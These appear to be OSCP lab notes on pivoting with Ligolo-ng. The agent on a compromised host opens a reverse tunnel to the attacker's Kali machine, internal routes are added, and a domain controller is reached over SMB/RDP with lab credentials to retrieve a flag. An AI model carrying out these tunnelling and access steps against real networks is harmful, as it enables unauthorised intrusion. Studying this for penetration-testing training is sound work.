## 🔹 Step 0 — Identify Architecture

### Linux

```
uname -m
```

- `x86_64` → amd64
- `aarch64` → arm64
### Windows

**CMD**

```cmd
systeminfo | findstr /i "System Type
```

**PowerShell**

```powershell
$env:PROCESSOR_ARCHITECTURE
```

> ⚠️ Always match **agent/proxy binary architecture** to the target.

---

## 🔹 Step 1 — Download Ligolo Binaries

- **Attacker (Kali)** → `proxy`
- **Target (Pivot host)** → `agent`

🔗 Release:  
[https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2)

---

## 🔹 Step 2 — Transfer Agent to Target

Example using SCP:

```
scp agent ubuntu@[IP]:~/Desktop
```

On target:

```
chmod +x agent
```

---

## 🔹 Step 3 — Create TUN Interface (Kali)

```
sudo ip tuntap add user kali mode tun ligolo
```

```
sudo ip link set ligolo up
```

### ⚠️ Error: Device or resource busy

If you see:

`ioctl(TUNSETIFF): Device or resource busy`

Fix:

`ip a | grep ligolo sudo ip link set ligolo up`

Or reset:

```
sudo ip link delete ligolo
```

```
 sudo ip tuntap add user kali mode tun ligolo 
```
 
```
sudo ip link set ligolo up
```

> ℹ️ TUN interface only needs to be created **once per reboot**

---

## 🔹 Step 4 — Start Ligolo Proxy (Kali)

```
./proxy -selfcert
```

Expected output:

`Listening on 0.0.0.0:11601`

Leave this running.

Reset Ligolo, delete saved config
```
rm ligolo-ng.yaml
```

---

## 🔹 Step 5 — Start Agent (Target)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `./agent.exe -connect ${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```
> ❗ Must include **port**

If restricted egress:

`./agent -connect https://<KALI_IP>:11601 -ignore-cert`

---

## 🔹 Step 6 — Start Tunnel (Ligolo Console)

In the Ligolo proxy interface:

```
session
```

Select session number, then:

```
start
```

---

## 🔹 Step 7 — Identify Internal Network

Inside Ligolo console:

```
ifconfig
```

Look for internal subnet (e.g. `172.16.5.0/23`)

---

## 🔹 Step 8 — Add Route (Kali)

```
sudo ip route add <INTERNAL_SUBNET> dev ligolo
```

Example:

`sudo ip route add 172.16.4.0/23 dev ligolo`

Verify:

```
ip route list
```

---

## 🔹 Step 9 — Verify Pivot

```
ping 172.16.5.19
```

Optional:

`nmap -p 445,3389,22 172.16.5.19`

If ping works → pivot is **fully functional** ✅

---

## 🔹 Step 10 — Access Internal Host (DC)

Credentials:

`victor : pass@123`

### Option A — SMB (Most Reliable)

```
smbclient //172.16.5.19/C$ -U victor
```

```
cd Users/victor/Downloads
```

get flag.txt`

---

### Option B — RDP

`xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'`

Open:

`C:\Users\victor\Downloads\flag.txt`